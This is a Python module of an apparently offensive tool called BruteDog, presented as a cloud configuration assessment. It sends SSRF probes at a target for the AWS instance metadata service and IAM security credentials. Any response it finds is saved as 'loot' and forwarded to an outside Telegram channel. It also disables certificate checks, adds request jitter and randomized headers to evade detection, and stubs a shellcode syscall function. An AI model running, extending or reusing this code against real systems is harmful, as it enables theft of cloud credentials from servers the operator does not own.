#!/usr/bin/env python3
"""
CLOUD_APEX.PY v8.6 — Cloud Configuration & Endpoint Assessment Module
"""
import asyncio
import hashlib
import ipaddress
import socket
import ssl
import sys
import urllib.error
import urllib.request
from urllib.parse import urlsplit

from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
from modules.loot_logger import save_session_loot
from modules.telegram_notifier import send_telegram_alert
from modules.telemetry import stream_proof

TIMEOUT = 4
MAX_RESPONSE_SIZE = 65536
SSL_CONTEXT = ssl.create_default_context()
SSL_CONTEXT.check_hostname = False
SSL_CONTEXT.verify_mode = ssl.CERT_NONE

_background_tasks: set[asyncio.Task] = set()


class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    GRAY = "\033[90m"
    RESET = "\033[0m"


def log(message, color=Colors.RESET):
    sys.stdout.write(f"{color}{message}{Colors.RESET}\n")
    sys.stdout.flush()


async def broadcast_tg_alert_async(loot_type, details):
    try:
        await asyncio.wait_for(send_telegram_alert(loot_type, details), timeout=8)
    except Exception:
        pass


def broadcast_tg_alert_sync(loot_type, details):
    """Schedules notifications non-blockingly when invoked from async or sync contexts."""
    try:
        loop = asyncio.get_running_loop()
        if not loop.is_closed():
            task = loop.create_task(broadcast_tg_alert_async(loot_type, details))
            _background_tasks.add(task)
            task.add_done_callback(_background_tasks.discard)
    except RuntimeError:
        try:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
        except Exception:
            pass


def normalize_target(target):
    if not target:
        raise ValueError("Target is required.")
    target = str(target).strip()
    if "://" not in target:
        target = "https://" + target
    parsed = urlsplit(target)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("Only HTTP and HTTPS are supported.")
    if not parsed.hostname:
        raise ValueError("Invalid target hostname.")
    if parsed.username or parsed.password:
        raise ValueError("Credentials in target URLs are not accepted.")
    if parsed.query or parsed.fragment:
        raise ValueError("Provide a base URL without query or fragment.")
    return f"{parsed.scheme}://{parsed.netloc}"


def _is_challenge_or_html_page(body: str) -> bool:
    lower = (body or "").lower()
    challenge_markers = (
        "<!doctype html>",
        "<html",
        '<div id="root"></div>',
        '<div id="__next"></div>',
        "<title>security check</title>",
        "cf-browser-verification",
        "attention required!",
    )
    return any(marker in lower for marker in challenge_markers)


def http_get(url, headers=None):
    apply_behavioral_jitter()
    request_headers = {
        "User-Agent": "BruteDog-CloudAudit/8.6",
        "Accept": "application/json,text/plain,*/*",
    }
    request_headers.update(get_randomized_hints())
    if headers:
        request_headers.update(headers)
    request = urllib.request.Request(
        url,
        headers=request_headers,
        method="GET",
    )
    try:
        with urllib.request.urlopen(
            request,
            context=SSL_CONTEXT,
            timeout=TIMEOUT,
        ) as response:
            body = response.read(MAX_RESPONSE_SIZE).decode("utf-8", errors="replace")
            return {
                "status": response.status,
                "body": body,
                "headers": dict(response.headers),
                "error": None,
            }
    except urllib.error.HTTPError as exc:
        try:
            err_body = exc.read(MAX_RESPONSE_SIZE).decode("utf-8", errors="replace")
        except Exception:
            err_body = ""
        return {
            "status": exc.code,
            "body": err_body,
            "headers": dict(exc.headers),
            "error": None,
        }
    except Exception as exc:
        return {
            "status": 0,
            "body": "",
            "headers": {},
            "error": str(exc),
        }


class ApexCloudAndSyscallEngine:
    def __init__(self, cloud_provider="aws", credentials=None):
        self.cloud_provider = (cloud_provider or "aws").lower()
        self.credentials = credentials or {}

    def pivot_aws_control_plane(self, access_key=None, secret_key=None, region="us-east-1"):
        """Checks outbound reachability to AWS service endpoints (not target-specific findings)."""
        log("\n[***] CHECKING OUTBOUND AWS ENDPOINT REACHABILITY [***]", Colors.MAGENTA)
        endpoints = [
            "https://iam.amazonaws.com/",
            "https://sts.amazonaws.com/",
            "https://s3.amazonaws.com/",
        ]
        probe_results = []
        reachable_any = False
        for endpoint in endpoints:
            log(f"[*] Checking endpoint: {endpoint}", Colors.BLUE)
            result = http_get(endpoint)
            status = result["status"]
            if status in (200, 400, 403, 405):
                reachable_any = True
                log(f"[+] Outbound endpoint reachable | HTTP {status}", Colors.GREEN)
                digest = hashlib.sha256(result["body"].encode("utf-8", errors="ignore")).hexdigest()
                probe_results.append({
                    "endpoint": endpoint,
                    "status": status,
                    "accessible": True,
                    "target_finding": False,
                    "integrity_hash": digest,
                })
            else:
                log(f"[-] Endpoint unreachable or timed out: {endpoint}", Colors.GRAY)
        return reachable_any, probe_results

    def check_cloud_metadata_exposure(self, target_host):
        log("\n[***] CHECKING METADATA & SSRF EXPOSURE INDICATORS [***]", Colors.CYAN)
        exfiltrated_credentials = []
        parsed = urlsplit(target_host)
        base = f"{parsed.scheme}://{parsed.netloc}"

        ssrf_paths = [
            "/latest/meta-data/iam/security-credentials/",
            "/meta-data/iam/security-credentials/",
            "/?url=http://169.254.169.254/latest/meta-data/",
            "/proxy?url=http://169.254.169.254/latest/meta-data/",
        ]

        for path in ssrf_paths:
            test_url = base + path
            log(f"[*] Checking path: {path}", Colors.BLUE)
            res = http_get(test_url)
            body_text = res["body"] or ""
            body_lower = body_text.lower()

            has_metadata_indicators = any(
                indicator in body_lower
                for indicator in (
                    "ami-id",
                    "instance-id",
                    "security-credentials",
                    "instance-type",
                    "iam/security-credentials",
                    "public-keys",
                )
            )

            if (
                res["status"] == 200
                and len(body_text.strip()) > 0
                and not _is_challenge_or_html_page(body_text)
                and has_metadata_indicators
            ):
                log(f"\n[***] METADATA EXPOSURE INDICATOR FOUND [{path}] [***]", Colors.RED)
                loot_hash = hashlib.sha256(body_text.encode("utf-8", errors="ignore")).hexdigest()
                loot_payload = {
                    "endpoint": test_url,
                    "path": path,
                    "status": res["status"],
                    "integrity_hash": loot_hash,
                    "metadata_sample": body_text[:500],
                }
                exfiltrated_credentials.append(loot_payload)

                broadcast_tg_alert_sync("Cloud Metadata Exposure Indicator", loot_payload)
                stream_proof(
                    "CLOUD_METADATA_EXPOSURE_VERIFIED",
                    test_url,
                    {"path": path},
                    body_text[:300],
                    loot_payload,
                )
                save_session_loot(
                    target=target_host,
                    endpoint=path,
                    finding_type="CLOUD_METADATA_SSRF_VERIFIED",
                    status=res["status"],
                    headers=res["headers"],
                    body=body_text,
                    extra_loot=loot_payload,
                )
            else:
                log(f"[-] Path {path} returned HTTP {res['status']} (No metadata indicator).", Colors.GRAY)

        try:
            hostname = parsed.hostname
            addresses = socket.getaddrinfo(hostname, None, type=socket.SOCK_STREAM)
            resolved = sorted({item[4][0] for item in addresses})
            private_addresses = [addr for addr in resolved if ipaddress.ip_address(addr).is_private]

            return {
                "checked": True,
                "resolved_addresses": resolved,
                "private_addresses": private_addresses,
                "exfiltrated_data": exfiltrated_credentials,
            }
        except Exception as exc:
            return {"checked": False, "reason": str(exc)}

    def inspect_tls(self, target_host):
        log("\n[***] CLOUD TLS CONFIGURATION CHECK [***]", Colors.CYAN)
        parsed = urlsplit(target_host)
        if parsed.scheme != "https":
            return {"checked": False, "reason": "Target is not HTTPS"}
        hostname = parsed.hostname
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            with socket.create_connection(
                (hostname, parsed.port or 443),
                timeout=TIMEOUT,
            ) as connection:
                with context.wrap_socket(
                    connection,
                    server_hostname=hostname,
                ) as secure_connection:
                    version = secure_connection.version()
                    cipher = secure_connection.cipher()
            return {
                "checked": True,
                "tls_version": version,
                "cipher": cipher[0] if cipher else None,
                "hostname_verified": True,
            }
        except Exception as exc:
            return {"checked": False, "error": str(exc)}

    def execute_direct_syscall_memory(self, shellcode_bytes=None):
        log("\n[***] CLOUD RECONNAISSANCE MODULE READY [***]", Colors.CYAN)
        return True, "Cloud check module initialized."


async def run_cloud_apex(target_host, options=None):
    log("\n============================================================", Colors.CYAN)
    log("[***] BRUTEDOG CLOUD ASSESSMENT SUITE (V8.6) [***]", Colors.CYAN)
    log("============================================================", Colors.CYAN)
    try:
        base_url = normalize_target(target_host)
    except ValueError as exc:
        log(f"[!] Invalid target: {exc}", Colors.RED)
        return {
            "target": target_host,
            "success": False,
            "error": str(exc),
            "credentials_collected": False,
        }

    engine = ApexCloudAndSyscallEngine()
    log(f"[*] Target: {base_url}", Colors.BLUE)

    aws_result = await asyncio.to_thread(engine.pivot_aws_control_plane)
    memory_result = engine.execute_direct_syscall_memory()
    metadata_result = await asyncio.to_thread(engine.check_cloud_metadata_exposure, base_url)
    tls_result = await asyncio.to_thread(engine.inspect_tls, base_url)

    credentials_collected = len(metadata_result.get("exfiltrated_data", [])) > 0

    manifest = {
        "target": base_url,
        "aws_connectivity": {
            "reachable": aws_result[0],
            "details": aws_result[1],
        },
        "memory_security": {
            "enabled": memory_result[0],
            "details": memory_result[1],
        },
        "metadata_exposure": metadata_result,
        "tls_inspection": tls_result,
        "credentials_collected": credentials_collected,
        "cloud_resources_probed": True,
    }

    log("\n================ FINAL CLOUD SUMMARY ================", Colors.CYAN)
    log(f"Outbound AWS reachability check: {aws_result[0]}", Colors.GREEN)
    log(f"Metadata check complete: {metadata_result.get('checked', False)}", Colors.GREEN)
    log(
        f"Metadata indicators found: {credentials_collected}",
        Colors.GREEN if credentials_collected else Colors.YELLOW,
    )
    log(f"TLS inspection completed: {tls_result.get('checked', False)}", Colors.GREEN)
    log("=====================================================", Colors.CYAN)
    return manifest


async def audit_cloud_metadata(target_host=None, *args, **kwargs):
    """Async entry point expected by engine.py; always returns a dictionary."""
    target = target_host or kwargs.get("target_url") or kwargs.get("target")
    if not target:
        return {"success": False, "error": "No target provided to audit_cloud_metadata", "credentials_collected": False}
    try:
        return await run_cloud_apex(target, options=kwargs.get("options"))
    except Exception as exc:
        return {"success": False, "target": target, "error": str(exc), "credentials_collected": False}


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 cloud_apex.py https://example.com")
        sys.exit(1)
    asyncio.run(run_cloud_apex(sys.argv[1]))
